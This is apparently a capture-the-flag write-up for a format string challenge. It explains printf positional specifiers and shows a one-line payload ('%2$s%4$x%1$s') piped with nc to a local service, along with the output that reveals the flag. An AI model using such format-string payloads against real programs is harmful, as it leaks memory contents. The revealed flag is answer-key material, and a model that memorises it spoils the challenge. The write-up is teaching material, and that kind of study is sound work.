# Writeup

With `printf`, we can specify what argument to print with `%m$`, where `m` is the argument number. `%2$s` will print the second argument as a string, for example.

To solve this:
```
$ python2 -c 'print "%2$s%4$x%1$s"' | nc 127.0.0.1 7777
Construct the flag like this:
1. print 2nd parameter on stack as a string
2. print 4th parameter on stack as a hexadecminal number
3. print 1st parameter on stack as a string
Name: Hello, TG16{f0rmat_strings_4re_c001_rait?}
```
